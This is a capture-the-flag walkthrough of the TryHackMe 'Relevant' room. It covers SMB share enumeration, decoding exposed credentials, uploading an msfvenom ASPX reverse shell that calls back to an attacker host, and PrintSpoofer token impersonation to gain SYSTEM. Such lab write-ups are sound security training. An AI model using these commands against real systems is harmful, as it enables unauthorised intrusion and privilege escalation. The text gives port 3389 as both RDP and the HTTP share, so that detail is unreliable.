🧠 TryHackMe - Relevant | Full Walkthrough 🔍

🚀 Introduction

In this write-up, we’ll walk through the Relevant room on TryHackMe — a well-structured boot-to-root challenge that tests real-world pentesting skills.

We follow a structured methodology:

    🔎 Reconnaissance

    🧩 Enumeration

    💣 Exploitation

    🧠 Privilege Escalation

Let's dive in.
🌐 Phase 1: Reconnaissance
🔍 Nmap Scan

We begin with a full TCP port scan:

nmap -sC -sV -p- -T4 <target-ip>

Open Ports Identified:

    139/tcp — NetBIOS

    445/tcp — SMB

    3389/tcp — RDP

    80/tcp — HTTP

📚 Protocol Insight

SMB (Server Message Block) allows file sharing across the network. Common in Windows environments, SMB is often misconfigured and can be a solid attack vector.

We use smbclient to enumerate shares:

smbclient -L //<target-ip> -N

Identified a share named nt4wrksv.

We connect:

smbclient //<target-ip>/nt4wrksv

Within it, we discover passwords.txt, base64-encoded.
🪓 Phase 2: Enumeration & Initial Access
📂 Decoding Credentials

Download the passwords.txt file, decode it:

cat passwords.txt | base64 -d

Credentials found.
🌐 Web Server Analysis

Exploring http://<target-ip>:3389/nt4wrksv/, we discover the same share exposed via HTTP.

Knowing we have upload permission, we weaponize this.
🐚 Gaining Initial Shell

Generate an ASPX reverse shell:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=53 -f aspx -o rev.aspx

Upload to the SMB share:

put rev.aspx

Trigger it from the browser:

http://<target-ip>:3389/nt4wrksv/rev.aspx

Listener catches the shell:

nc -lvnp 53

We're in as bob. User flag captured:

type C:\Users\bob\Desktop\user.txt

🔐 Phase 3: Privilege Escalation

Run privilege check:

whoami /priv

We see:

SeImpersonatePrivilege : Enabled

This allows token impersonation — a classic path to SYSTEM.

Use PrintSpoofer:

PrintSpoofer.exe -i -c cmd

Pop! SYSTEM shell achieved.

Read the final flag:

type C:\Users\Administrator\Desktop\root.txt

✅ Summary

Key Learnings:

    🔓 Weak SMB configuration led to sensitive file exposure

    🎯 Base64-encoded credentials were easily decoded

    🐚 ASPX shell upload exploited file write access

    🛡️ Misconfigured privileges (SeImpersonate) led to SYSTEM access

Real-World Takeaway:
Many environments still suffer from weak file sharing practices and overly permissive privileges. This room is a perfect example of why SMB misconfigurations are still a goldmine in internal networks.

    Difficulty: Medium | Focus: SMB Enumeration, Web Exploitation, Privilege Escalation
